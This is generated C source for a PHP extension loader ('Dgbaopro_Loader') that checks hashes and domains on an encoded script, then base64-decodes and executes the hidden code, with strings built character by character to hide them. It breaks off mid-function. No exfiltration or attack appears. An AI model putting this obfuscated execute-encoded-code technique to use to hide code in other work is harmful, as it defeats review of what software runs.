
#ifdef HAVE_CONFIG_H
#include "../ext_config.h"
#endif

#include <php.h>
#include "../php_ext.h"
#include "../ext.h"

#include <Zend/zend_operators.h>
#include <Zend/zend_exceptions.h>
#include <Zend/zend_interfaces.h>

#include "kernel/main.h"
#include "kernel/file.h"
#include "kernel/concat.h"
#include "kernel/memory.h"
#include "kernel/array.h"
#include "kernel/string.h"
#include "kernel/operators.h"
#include "kernel/exit.h"
#include "kernel/fcall.h"
#include "kernel/object.h"


ZEPHIR_INIT_CLASS(Dgbaopro_Loader)
{
	ZEPHIR_REGISTER_CLASS(Dgbaopro, Loader, dgbaopro, loader, dgbaopro_loader_method_entry, 0);

	zend_declare_property_bool(dgbaopro_loader_ce, SL("p"), 0, ZEND_ACC_PRIVATE|ZEND_ACC_STATIC);
	zend_declare_property_bool(dgbaopro_loader_ce, SL("l"), 0, ZEND_ACC_PRIVATE|ZEND_ACC_STATIC);
	zend_declare_property_bool(dgbaopro_loader_ce, SL("o"), 1, ZEND_ACC_PRIVATE|ZEND_ACC_STATIC);
	zend_declare_property_bool(dgbaopro_loader_ce, SL("old"), 0, ZEND_ACC_PRIVATE|ZEND_ACC_STATIC);
	zend_declare_property_null(dgbaopro_loader_ce, SL("table"), ZEND_ACC_PRIVATE|ZEND_ACC_STATIC);
	return SUCCESS;
}

PHP_METHOD(Dgbaopro_Loader, ___)
{
	zval _94$$21;
	zend_bool ____, _51, _53, _60, h, _93, _64$$7, _82$$14, _87$$17;
	zval _1, _3, _7, _10, _15, _29, _32, _35, _46, _48, _68, _69, _76, _77$$10, _85$$14, _90$$17;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS, i$$10;
	zephir_fcall_cache_entry *_39 = NULL, *_40 = NULL, *_43 = NULL, *_71 = NULL, *_99 = NULL, *_100 = NULL;
	zval _SERVER, __$false, __$true, __, _0, _2, _4, _5, ___, _6, _8, n, _9, _11, _12, _13, _14, _____, _17, _18, ______, _19, _20, _______, _21, _22, a, _23, _24, p, _25, _26, _, _27, _28, _30, d, _31, _33, r, _34, _36, _37, _42, _44, _45, _47, _49, _50, _52, _54, _55, _56, _57, _58, _59, _61, _67, _70, _73, _74, _75, _16$$3, _38$$4, _41$$4, _62$$7, _63$$7, _65$$7, _66$$8, _72$$9, _78$$10, v$$10, _79$$10, _80$$10, _81$$14, _83$$14, _84$$14, _86$$17, _88$$17, _89$$17, _91$$17, _92$$19, _95$$21, _96$$21, _97$$21, _98$$21, _101$$24;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_SERVER);
	ZVAL_BOOL(&__$false, 0);
	ZVAL_BOOL(&__$true, 1);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_4);
	ZVAL_UNDEF(&_5);
	ZVAL_UNDEF(&___);
	ZVAL_UNDEF(&_6);
	ZVAL_UNDEF(&_8);
	ZVAL_UNDEF(&n);
	ZVAL_UNDEF(&_9);
	ZVAL_UNDEF(&_11);
	ZVAL_UNDEF(&_12);
	ZVAL_UNDEF(&_13);
	ZVAL_UNDEF(&_14);
	ZVAL_UNDEF(&_____);
	ZVAL_UNDEF(&_17);
	ZVAL_UNDEF(&_18);
	ZVAL_UNDEF(&______);
	ZVAL_UNDEF(&_19);
	ZVAL_UNDEF(&_20);
	ZVAL_UNDEF(&_______);
	ZVAL_UNDEF(&_21);
	ZVAL_UNDEF(&_22);
	ZVAL_UNDEF(&a);
	ZVAL_UNDEF(&_23);
	ZVAL_UNDEF(&_24);
	ZVAL_UNDEF(&p);
	ZVAL_UNDEF(&_25);
	ZVAL_UNDEF(&_26);
	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&_27);
	ZVAL_UNDEF(&_28);
	ZVAL_UNDEF(&_30);
	ZVAL_UNDEF(&d);
	ZVAL_UNDEF(&_31);
	ZVAL_UNDEF(&_33);
	ZVAL_UNDEF(&r);
	ZVAL_UNDEF(&_34);
	ZVAL_UNDEF(&_36);
	ZVAL_UNDEF(&_37);
	ZVAL_UNDEF(&_42);
	ZVAL_UNDEF(&_44);
	ZVAL_UNDEF(&_45);
	ZVAL_UNDEF(&_47);
	ZVAL_UNDEF(&_49);
	ZVAL_UNDEF(&_50);
	ZVAL_UNDEF(&_52);
	ZVAL_UNDEF(&_54);
	ZVAL_UNDEF(&_55);
	ZVAL_UNDEF(&_56);
	ZVAL_UNDEF(&_57);
	ZVAL_UNDEF(&_58);
	ZVAL_UNDEF(&_59);
	ZVAL_UNDEF(&_61);
	ZVAL_UNDEF(&_67);
	ZVAL_UNDEF(&_70);
	ZVAL_UNDEF(&_73);
	ZVAL_UNDEF(&_74);
	ZVAL_UNDEF(&_75);
	ZVAL_UNDEF(&_16$$3);
	ZVAL_UNDEF(&_38$$4);
	ZVAL_UNDEF(&_41$$4);
	ZVAL_UNDEF(&_62$$7);
	ZVAL_UNDEF(&_63$$7);
	ZVAL_UNDEF(&_65$$7);
	ZVAL_UNDEF(&_66$$8);
	ZVAL_UNDEF(&_72$$9);
	ZVAL_UNDEF(&_78$$10);
	ZVAL_UNDEF(&v$$10);
	ZVAL_UNDEF(&_79$$10);
	ZVAL_UNDEF(&_80$$10);
	ZVAL_UNDEF(&_81$$14);
	ZVAL_UNDEF(&_83$$14);
	ZVAL_UNDEF(&_84$$14);
	ZVAL_UNDEF(&_86$$17);
	ZVAL_UNDEF(&_88$$17);
	ZVAL_UNDEF(&_89$$17);
	ZVAL_UNDEF(&_91$$17);
	ZVAL_UNDEF(&_92$$19);
	ZVAL_UNDEF(&_95$$21);
	ZVAL_UNDEF(&_96$$21);
	ZVAL_UNDEF(&_97$$21);
	ZVAL_UNDEF(&_98$$21);
	ZVAL_UNDEF(&_101$$24);
	ZVAL_UNDEF(&_1);
	ZVAL_UNDEF(&_3);
	ZVAL_UNDEF(&_7);
	ZVAL_UNDEF(&_10);
	ZVAL_UNDEF(&_15);
	ZVAL_UNDEF(&_29);
	ZVAL_UNDEF(&_32);
	ZVAL_UNDEF(&_35);
	ZVAL_UNDEF(&_46);
	ZVAL_UNDEF(&_48);
	ZVAL_UNDEF(&_68);
	ZVAL_UNDEF(&_69);
	ZVAL_UNDEF(&_76);
	ZVAL_UNDEF(&_77$$10);
	ZVAL_UNDEF(&_85$$14);
	ZVAL_UNDEF(&_90$$17);
	ZVAL_UNDEF(&_94$$21);


	ZEPHIR_MM_GROW();
	zephir_get_global(&_SERVER, SL("_SERVER"));

	ZEPHIR_INIT_VAR(&_1);
	ZEPHIR_CONCAT_SSSSSSSSSSSSSSS(&_1, "S", "C", "R", "I", "P", "T", "_", "F", "I", "L", "E", "N", "A", "M", "E");
	zephir_array_fetch(&_0, &_SERVER, &_1, PH_NOISY | PH_READONLY, "dichvucoder.com", 10);
	ZEPHIR_INIT_VAR(&__);
	zephir_file_get_contents(&__, &_0);
	ZEPHIR_INIT_VAR(&_2);
	ZEPHIR_INIT_VAR(&_3);
	ZEPHIR_CONCAT_SSSSSS(&_3, "+", "%", "E", "N", "D", "%");
	zephir_fast_explode(&_2, &_3, &__, LONG_MAX);
	zephir_array_fetch_long(&_4, &_2, 0, PH_NOISY | PH_READONLY, "dichvucoder.com", 11);
	ZEPHIR_INIT_VAR(&_5);
	ZEPHIR_CONCAT_VSSSSSS(&_5, &_4, "+", "%", "E", "N", "D", "%");
	ZEPHIR_CPY_WRT(&__, &_5);
	ZEPHIR_INIT_VAR(&_6);
	ZEPHIR_INIT_VAR(&_7);
	ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSSSSSS(&_7, "_", "_", "H", "A", "L", "T", "_", "C", "O", "M", "P", "I", "L", "E", "R", "(", ")", ";", " ", "?", ">");
	zephir_fast_explode(&_6, &_7, &__, LONG_MAX);
	zephir_array_fetch_long(&_8, &_6, 1, PH_NOISY | PH_READONLY, "dichvucoder.com", 12);
	ZEPHIR_INIT_VAR(&___);
	zephir_fast_trim(&___, &_8, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_9);
	ZEPHIR_INIT_VAR(&_10);
	ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSSSSSS(&_10, "_", "_", "H", "A", "L", "T", "_", "C", "O", "M", "P", "I", "L", "E", "R", "(", ")", ";", " ", "?", ">");
	zephir_fast_explode(&_9, &_10, &__, LONG_MAX);
	zephir_array_fetch_long(&_11, &_9, 0, PH_NOISY | PH_READONLY, "dichvucoder.com", 13);
	ZEPHIR_INIT_VAR(&n);
	zephir_fast_trim(&n, &_11, NULL , ZEPHIR_TRIM_BOTH);
	____ = 1;
	ZVAL_LONG(&_12, 0);
	ZVAL_LONG(&_13, 9);
	ZEPHIR_INIT_VAR(&_14);
	zephir_substr(&_14, &___, 0 , 9 , 0);
	ZEPHIR_INIT_VAR(&_15);
	ZEPHIR_CONCAT_SSSSSSSSS(&_15, "D", "G", "B", "A", "O", "P", "R", "O", "+");
	if (!ZEPHIR_IS_IDENTICAL(&_14, &_15)) {
		ZEPHIR_INIT_VAR(&_16$$3);
		ZVAL_STRING(&_16$$3, "Encode ERROR : API execute : Không tìm thấy header encode !\n");
		ZEPHIR_MM_RESTORE();
		zephir_exit(&_16$$3);
		____ = 0;
	}
	ZVAL_LONG(&_17, 9);
	ZVAL_LONG(&_18, 32);
	ZEPHIR_INIT_VAR(&_____);
	zephir_substr(&_____, &___, 9 , 32 , 0);
	ZVAL_LONG(&_19, 41);
	ZVAL_LONG(&_20, 32);
	ZEPHIR_INIT_VAR(&______);
	zephir_substr(&______, &___, zephir_get_intval(&_19), 32 , 0);
	ZVAL_LONG(&_21, (41 + 32));
	ZVAL_LONG(&_22, 32);
	ZEPHIR_INIT_VAR(&_______);
	zephir_substr(&_______, &___, zephir_get_intval(&_21), 32 , 0);
	ZVAL_LONG(&_23, ((41 + 32) + 32));
	ZVAL_LONG(&_24, 32);
	ZEPHIR_INIT_VAR(&a);
	zephir_substr(&a, &___, zephir_get_intval(&_23), 32 , 0);
	ZVAL_LONG(&_25, (((41 + 32) + 32) + 32));
	ZVAL_LONG(&_26, 32);
	ZEPHIR_INIT_VAR(&p);
	zephir_substr(&p, &___, zephir_get_intval(&_25), 32 , 0);
	ZVAL_LONG(&_27, ((((41 + 32) + 32) + 32) + 32));
	ZEPHIR_INIT_VAR(&_);
	zephir_substr(&_, &___, zephir_get_intval(&_27), 0, ZEPHIR_SUBSTR_NO_LENGTH);
	ZEPHIR_INIT_VAR(&_28);
	ZEPHIR_INIT_VAR(&_29);
	ZEPHIR_CONCAT_SSSSSS(&_29, "+", "%", "E", "N", "D", "%");
	zephir_fast_explode(&_28, &_29, &_, LONG_MAX);
	zephir_array_fetch_long(&_30, &_28, 0, PH_NOISY | PH_READONLY, "dichvucoder.com", 25);
	ZEPHIR_INIT_NVAR(&_);
	zephir_fast_trim(&_, &_30, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&d);
	ZVAL_STRING(&d, "");
	ZEPHIR_INIT_VAR(&_31);
	ZEPHIR_INIT_VAR(&_32);
	ZEPHIR_CONCAT_SSSSSS(&_32, "S", "T", "O", "O", "L", "+");
	zephir_fast_explode(&_31, &_32, &_, LONG_MAX);
	zephir_array_fetch_long(&_33, &_31, 1, PH_NOISY | PH_READONLY, "dichvucoder.com", 27);
	ZEPHIR_INIT_NVAR(&d);
	zephir_fast_trim(&d, &_33, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_34);
	ZEPHIR_INIT_VAR(&_35);
	ZEPHIR_CONCAT_SSSSSS(&_35, "S", "T", "O", "O", "L", "+");
	zephir_fast_explode(&_34, &_35, &_, LONG_MAX);
	zephir_array_fetch_long(&_36, &_34, 2, PH_NOISY | PH_READONLY, "dichvucoder.com", 28);
	ZEPHIR_INIT_VAR(&r);
	zephir_fast_trim(&r, &_36, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_37);
	zephir_md5(&_37, &r);
	if (!ZEPHIR_IS_IDENTICAL(&_37, &p)) {
		____ = 0;
		ZEPHIR_INIT_VAR(&_38$$4);
		ZVAL_STRING(&_38$$4, "Encode ERROR : API execute : Lỗi phân đoạn thực thi !\n");
		ZEPHIR_CALL_FUNCTION(NULL, "print_r", &_39, 1, &_38$$4);
		zephir_check_call_status();
		ZVAL_BOOL(&_41$$4, 1);
		ZEPHIR_CALL_STATIC(NULL, "__", &_40, 2, &_41$$4);
		zephir_check_call_status();
	}
	ZEPHIR_CALL_STATIC(&_42, "__________", &_43, 3, &r);
	zephir_check_call_status();
	ZEPHIR_CPY_WRT(&r, &_42);
	ZEPHIR_INIT_VAR(&_44);
	zephir_fast_explode_str(&_44, SL("$"), &r, LONG_MAX);
	zephir_array_fetch_long(&_45, &_44, 1, PH_NOISY | PH_READONLY, "dichvucoder.com", 35);
	ZEPHIR_INIT_NVAR(&r);
	zephir_fast_trim(&r, &_45, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_46);
	ZEPHIR_CONCAT_SSSSSSSSS(&_46, "%", "#", "f", "a", "l", "s", "e", "#", "%");
	if (ZEPHIR_IS_EQUAL(&r, &_46)) {
		zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("o"), &__$false);
	} else {
		zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("o"), &__$true);
	}
	ZEPHIR_INIT_VAR(&_47);
	ZEPHIR_INIT_VAR(&_48);
	ZEPHIR_CONCAT_SSSSSS(&_48, "S", "T", "O", "O", "L", "+");
	zephir_fast_explode(&_47, &_48, &_, LONG_MAX);
	zephir_array_fetch_long(&_49, &_47, 0, PH_NOISY | PH_READONLY, "dichvucoder.com", 41);
	ZEPHIR_INIT_NVAR(&_);
	zephir_fast_trim(&_, &_49, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_50);
	zephir_md5(&_50, &_);
	_51 = !ZEPHIR_IS_IDENTICAL(&_50, &_______);
	if (!(_51)) {
		ZEPHIR_INIT_VAR(&_52);
		zephir_md5(&_52, &d);
		_51 = !ZEPHIR_IS_IDENTICAL(&_52, &a);
	}
	_53 = _51;
	if (!(_53)) {
		ZEPHIR_INIT_VAR(&_54);
		ZEPHIR_INIT_VAR(&_55);
		ZEPHIR_INIT_VAR(&_56);
		ZEPHIR_INIT_VAR(&_57);
		zephir_fast_explode_str(&_57, SL("*/"), &__, LONG_MAX);
		zephir_array_fetch_long(&_58, &_57, 0, PH_NOISY | PH_READONLY, "dichvucoder.com", 42);
		zephir_fast_explode_str(&_56, SL("/*"), &_58, LONG_MAX);
		zephir_array_fetch_long(&_59, &_56, 1, PH_NOISY | PH_READONLY, "dichvucoder.com", 42);
		zephir_fast_trim(&_55, &_59, NULL , ZEPHIR_TRIM_BOTH);
		zephir_md5(&_54, &_55);
		_53 = !ZEPHIR_IS_IDENTICAL(&_54, &_____);
	}
	_60 = _53;
	if (!(_60)) {
		ZEPHIR_INIT_VAR(&_61);
		zephir_md5(&_61, &n);
		_60 = !ZEPHIR_IS_IDENTICAL(&_61, &______);
	}
	if (_60) {
		ZEPHIR_INIT_VAR(&_62$$7);
		ZVAL_STRING(&_62$$7, "Encode ERROR : API execute : Lỗi xác thực dữ liệu !\n");
		ZEPHIR_CALL_FUNCTION(NULL, "print_r", &_39, 1, &_62$$7);
		zephir_check_call_status();
		____ = 0;
		zephir_read_static_property_ce(&_63$$7, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
		_64$$7 = zephir_is_true(&_63$$7);
		if (_64$$7) {
			zephir_read_static_property_ce(&_65$$7, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
			_64$$7 = !ZEPHIR_IS_FALSE_IDENTICAL(&_65$$7);
		}
		if (_64$$7) {
			ZVAL_BOOL(&_66$$8, 1);
			ZEPHIR_CALL_STATIC(NULL, "__", &_40, 2, &_66$$8);
			zephir_check_call_status();
		}
	}
	ZEPHIR_INIT_VAR(&_67);
	ZEPHIR_INIT_VAR(&_68);
	ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSS(&_68, "d", "i", "s", "a", "b", "l", "e", "_", "f", "u", "n", "c", "t", "i", "o", "n", "s");
	ZEPHIR_CALL_FUNCTION(&_42, "ini_get", NULL, 4, &_68);
	zephir_check_call_status();
	zephir_fast_trim(&_67, &_42, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_69);
	ZEPHIR_CONCAT_SSSSSSSSSSSSSSS(&_69, "e", "r", "r", "o", "r", "_", "r", "e", "p", "o", "r", "t", "i", "n", "g");
	ZEPHIR_CALL_FUNCTION(&_70, "strstr", &_71, 5, &_67, &_69);
	zephir_check_call_status();
	if (zephir_fast_strlen_ev(&_70) > 0) {
		ZEPHIR_INIT_VAR(&_72$$9);
		ZVAL_STRING(&_72$$9, "Encode ERROR : API execute : Lỗi xác thực error_reporting !\n");
		ZEPHIR_MM_RESTORE();
		zephir_exit(&_72$$9);
		____ = 0;
	}
	h = 0;
	ZEPHIR_CALL_STATIC(&_73, "__________", &_43, 3, &d);
	zephir_check_call_status();
	ZEPHIR_CPY_WRT(&d, &_73);
	ZEPHIR_INIT_VAR(&_74);
	zephir_fast_explode_str(&_74, SL("$"), &d, LONG_MAX);
	zephir_array_fetch_long(&_75, &_74, 1, PH_NOISY | PH_READONLY, "dichvucoder.com", 55);
	ZEPHIR_INIT_NVAR(&d);
	zephir_fast_trim(&d, &_75, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_76);
	ZEPHIR_CONCAT_SSSSS(&_76, "%", "a", "l", "l", "%");
	if (!ZEPHIR_IS_IDENTICAL(&d, &_76)) {
		ZEPHIR_INIT_VAR(&_77$$10);
		ZEPHIR_CONCAT_SSSSS(&_77$$10, "%", "a", "l", "l", "%");
		ZEPHIR_CALL_FUNCTION(&_78$$10, "strstr", &_71, 5, &d, &_77$$10);
		zephir_check_call_status();
		if (zephir_fast_strlen_ev(&_78$$10) > 0) {
			h = 1;
		}
		ZEPHIR_INIT_VAR(&v$$10);
		array_init(&v$$10);
		ZEPHIR_INIT_VAR(&_79$$10);
		ZVAL_STRING(&_79$$10, ";");
		ZEPHIR_CALL_FUNCTION(&_80$$10, "strstr", &_71, 5, &d, &_79$$10);
		zephir_check_call_status();
		if (zephir_fast_strlen_ev(&_80$$10) > 0) {
			ZEPHIR_INIT_NVAR(&v$$10);
			zephir_fast_explode_str(&v$$10, SL(";"), &d, LONG_MAX);
		} else {
			zephir_array_update_long(&v$$10, 0, &d, PH_COPY | PH_SEPARATE ZEPHIR_DEBUG_PARAMS_DUMMY);
		}
		i$$10 = 0;
		while (1) {
			if (!(1)) {
				break;
			}
			ZEPHIR_OBS_NVAR(&_81$$14);
			zephir_array_fetch_long(&_81$$14, &v$$10, i$$10, PH_NOISY, "dichvucoder.com", 68);
			_82$$14 = ZEPHIR_IS_EMPTY(&_81$$14);
			if (!(_82$$14)) {
				_82$$14 = !(zephir_array_isset_long(&v$$10, i$$10));
			}
			if (_82$$14) {
				break;
			}
			zephir_array_fetch_long(&_83$$14, &v$$10, i$$10, PH_NOISY | PH_READONLY, "dichvucoder.com", 71);
			ZEPHIR_INIT_NVAR(&_85$$14);
			ZEPHIR_CONCAT_SSSSSSSSSSS(&_85$$14, "S", "E", "R", "V", "E", "R", "_", "N", "A", "M", "E");
			zephir_array_fetch(&_84$$14, &_SERVER, &_85$$14, PH_NOISY | PH_READONLY, "dichvucoder.com", 71);
			if (ZEPHIR_IS_EQUAL(&_83$$14, &_84$$14)) {
				h = 1;
				break;
			}
			i$$10 = (i$$10 + 1);
		}
		i$$10 = 0;
		while (1) {
			if (!(1)) {
				break;
			}
			ZEPHIR_OBS_NVAR(&_86$$17);
			zephir_array_fetch_long(&_86$$17, &v$$10, i$$10, PH_NOISY, "dichvucoder.com", 79);
			_87$$17 = ZEPHIR_IS_EMPTY(&_86$$17);
			if (!(_87$$17)) {
				_87$$17 = !(zephir_array_isset_long(&v$$10, i$$10));
			}
			if (_87$$17) {
				break;
			}
			zephir_array_fetch_long(&_88$$17, &v$$10, i$$10, PH_NOISY | PH_READONLY, "dichvucoder.com", 82);
			ZEPHIR_INIT_NVAR(&_90$$17);
			ZEPHIR_CONCAT_SSSSSSSSSSS(&_90$$17, "S", "E", "R", "V", "E", "R", "_", "N", "A", "M", "E");
			zephir_array_fetch(&_89$$17, &_SERVER, &_90$$17, PH_NOISY | PH_READONLY, "dichvucoder.com", 82);
			ZEPHIR_INIT_NVAR(&_91$$17);
			ZEPHIR_CONCAT_SV(&_91$$17, "!", &_89$$17);
			if (ZEPHIR_IS_EQUAL(&_88$$17, &_91$$17)) {
				h = 0;
				ZEPHIR_INIT_NVAR(&_92$$19);
				ZVAL_STRING(&_92$$19, "Encode ERROR : API execute : Lỗi xác thực tên miền !\n");
				ZEPHIR_MM_RESTORE();
				zephir_exit(&_92$$19);
				break;
			}
			i$$10 = (i$$10 + 1);
		}
	} else {
		h = 1;
	}
	_93 = ____;
	if (_93) {
		_93 = h;
	}
	if (_93) {
		zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("p"), &__$true);
		ZEPHIR_INIT_VAR(&_94$$21);
		zephir_create_array(&_94$$21, 67, 0);
		add_assoc_stringl_ex(&_94$$21, SL("a"), SL("\xec"));
		add_assoc_stringl_ex(&_94$$21, SL("b"), SL("\xed"));
		add_assoc_stringl_ex(&_94$$21, SL("c"), SL("\xee"));
		add_assoc_stringl_ex(&_94$$21, SL("d"), SL("\xef"));
		add_assoc_stringl_ex(&_94$$21, SL("e"), SL("\xff"));
		add_assoc_stringl_ex(&_94$$21, SL("f"), SL("\xfe"));
		add_assoc_stringl_ex(&_94$$21, SL("g"), SL("\xfa"));
		add_assoc_stringl_ex(&_94$$21, SL("h"), SL("\xdf"));
		add_assoc_stringl_ex(&_94$$21, SL("i"), SL("\xfb"));
		add_assoc_stringl_ex(&_94$$21, SL("j"), SL("\xda"));
		add_assoc_stringl_ex(&_94$$21, SL("k"), SL("\xde"));
		add_assoc_stringl_ex(&_94$$21, SL("."), SL("\xf0"));
		add_assoc_stringl_ex(&_94$$21, SL("l"), SL("\xfc"));
		add_assoc_stringl_ex(&_94$$21, SL("m"), SL("\xfd"));
		add_assoc_stringl_ex(&_94$$21, SL("n"), SL("\xf5"));
		add_assoc_stringl_ex(&_94$$21, SL("o"), SL("\xe2"));
		add_assoc_stringl_ex(&_94$$21, SL("p"), SL("\xd9"));
		add_assoc_stringl_ex(&_94$$21, SL("q"), SL("\xd3"));
		add_assoc_stringl_ex(&_94$$21, SL("r"), SL("\xe7"));
		add_assoc_stringl_ex(&_94$$21, SL("s"), SL("\xe1"));
		add_assoc_stringl_ex(&_94$$21, SL("t"), SL("\xd7"));
		add_assoc_stringl_ex(&_94$$21, SL("u"), SL("\xf7"));
		add_assoc_stringl_ex(&_94$$21, SL("v"), SL("\xf9"));
		add_assoc_stringl_ex(&_94$$21, SL("w"), SL("\x9f"));
		add_assoc_stringl_ex(&_94$$21, SL("x"), SL("\x8f"));
		add_assoc_stringl_ex(&_94$$21, SL("y"), SL("\x9e"));
		add_assoc_stringl_ex(&_94$$21, SL("z"), SL("\x9b"));
		add_assoc_stringl_ex(&_94$$21, SL("1"), SL("\x82"));
		add_assoc_stringl_ex(&_94$$21, SL("2"), SL("\x95"));
		add_assoc_stringl_ex(&_94$$21, SL("3"), SL("\x85"));
		add_assoc_stringl_ex(&_94$$21, SL("4"), SL("\x92"));
		add_assoc_stringl_ex(&_94$$21, SL("5"), SL("\x94"));
		add_assoc_stringl_ex(&_94$$21, SL("6"), SL("\x96"));
		add_assoc_stringl_ex(&_94$$21, SL("7"), SL("\x87"));
		add_assoc_stringl_ex(&_94$$21, SL("8"), SL("\x88"));
		add_assoc_stringl_ex(&_94$$21, SL("9"), SL("\x89"));
		add_assoc_stringl_ex(&_94$$21, SL("_"), SL("\x8a"));
		add_assoc_stringl_ex(&_94$$21, SL("A"), SL("\xa0"));
		add_assoc_stringl_ex(&_94$$21, SL("B"), SL("\xa1"));
		add_assoc_stringl_ex(&_94$$21, SL("C"), SL("\xa2"));
		add_assoc_stringl_ex(&_94$$21, SL("D"), SL("\xa3"));
		add_assoc_stringl_ex(&_94$$21, SL("E"), SL("\xa4"));
		add_assoc_stringl_ex(&_94$$21, SL("F"), SL("\xa5"));
		add_assoc_stringl_ex(&_94$$21, SL("G"), SL("\xa6"));
		add_assoc_stringl_ex(&_94$$21, SL("H"), SL("\xa7"));
		add_assoc_stringl_ex(&_94$$21, SL("I"), SL("\xa8"));
		add_assoc_stringl_ex(&_94$$21, SL("J"), SL("\xa9"));
		add_assoc_stringl_ex(&_94$$21, SL("K"), SL("\xbf"));
		add_assoc_stringl_ex(&_94$$21, SL("L"), SL("\xcf"));
		add_assoc_stringl_ex(&_94$$21, SL("M"), SL("\xca"));
		add_assoc_stringl_ex(&_94$$21, SL("N"), SL("\xc1"));
		add_assoc_stringl_ex(&_94$$21, SL("O"), SL("\xc8"));
		add_assoc_stringl_ex(&_94$$21, SL("P"), SL("\xb0"));
		add_assoc_stringl_ex(&_94$$21, SL("Q"), SL("\xb1"));
		add_assoc_stringl_ex(&_94$$21, SL("R"), SL("\xba"));
		add_assoc_stringl_ex(&_94$$21, SL("S"), SL("\xbb"));
		add_assoc_stringl_ex(&_94$$21, SL("T"), SL("\xbc"));
		add_assoc_stringl_ex(&_94$$21, SL("U"), SL("\xb4"));
		add_assoc_stringl_ex(&_94$$21, SL("V"), SL("\xb5"));
		add_assoc_stringl_ex(&_94$$21, SL("W"), SL("\xcc"));
		add_assoc_stringl_ex(&_94$$21, SL("X"), SL("\xcb"));
		add_assoc_stringl_ex(&_94$$21, SL("Y"), SL("\xcd"));
		add_assoc_stringl_ex(&_94$$21, SL("Z"), SL("\xaa"));
		add_assoc_stringl_ex(&_94$$21, SL("/"), SL("\xaf"));
		add_assoc_stringl_ex(&_94$$21, SL("+"), SL("\xac"));
		add_assoc_stringl_ex(&_94$$21, SL("="), SL("\xab"));
		add_assoc_stringl_ex(&_94$$21, SL("0"), SL("\x91"));
		zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("table"), &_94$$21);
		ZEPHIR_INIT_VAR(&_95$$21);
		ZEPHIR_INIT_VAR(&_96$$21);
		ZVAL_STRING(&_96$$21, "aWYoIWZ1bmN0aW9uX2V4aXN0cygiX192aXBfbG9naW4iKSl7ZnVuY3Rpb24gX192aXBfbG9naW4oJGtleSl7cmV0dXJuIGRnYmFvcHJvXHZpcDo6bG9naW4oJGtleSk7fX1pZighZnVuY3Rpb25fZXhpc3RzKCJfX3ZpcF9hZGRzdHJlYW0iKSl7ZnVuY3Rpb24gX192aXBfYWRkc3RyZWFtKCRmdW5jLCRwYXJhbSA9IE5VTEwsJGxvY2sgPSBmYWxzZSl7cmV0dXJuIGRnYmFvcHJvXHZpcDo6YWRkc3RyZWFtKCRmdW5jLCRwYXJhbSwkbG9jayk7fX1pZighZnVuY3Rpb25fZXhpc3RzKCJfX3ZpcF9leGl0c3RyZWFtIikpe2Z1bmN0aW9uIF9fdmlwX2V4aXRzdHJlYW0oKXtyZXR1cm4gZGdiYW9wcm9cdmlwOjpleGl0c3RyZWFtKDApO319aWYoIWZ1bmN0aW9uX2V4aXN0cygiX192aXBfZXJyb3IiKSl7ZnVuY3Rpb24gX192aXBfZXJyb3IoKXtyZXR1cm4gZGdiYW9wcm9cdmlwOjokZXJyb3I7fX0=");
		ZEPHIR_CALL_FUNCTION(&_97$$21, "base64_decode", NULL, 6, &_96$$21);
		zephir_check_call_status();
		dgbaopro_exec(&_97$$21, &_95$$21, "dichvucoder.com");
		zephir_read_static_property_ce(&_98$$21, dgbaopro_loader_ce, SL("old"), PH_NOISY_CC | PH_READONLY);
		if (zephir_is_true(&_98$$21)) {
			ZEPHIR_CALL_STATIC(NULL, "____", &_99, 7, &_);
			zephir_check_call_status();
		} else {
			ZEPHIR_CALL_STATIC(NULL, "exec", &_100, 8, &_);
			zephir_check_call_status();
		}
	} else {
		ZEPHIR_INIT_VAR(&_101$$24);
		ZVAL_STRING(&_101$$24, "Encode ERROR : API execute : Lỗi không xác định !\n");
		ZEPHIR_MM_RESTORE();
		zephir_exit(&_101$$24);
	}
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, ____)
{
	zval _3, _5;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zephir_fcall_cache_entry *_6 = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zval *__param = NULL, __$true, _0, _1, _2, __, _4, ___;
	zval _, _7;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&_7);
	ZVAL_BOOL(&__$true, 1);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_1);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&_4);
	ZVAL_UNDEF(&___);
	ZVAL_UNDEF(&_3);
	ZVAL_UNDEF(&_5);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(1, 1)
		Z_PARAM_STR(_)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 1, 0, &__param);
	zephir_get_strval(&_, __param);


	ZEPHIR_CALL_FUNCTION(&_0, "base64_decode", NULL, 6, &_);
	zephir_check_call_status();
	zephir_get_strval(&_, &_0);
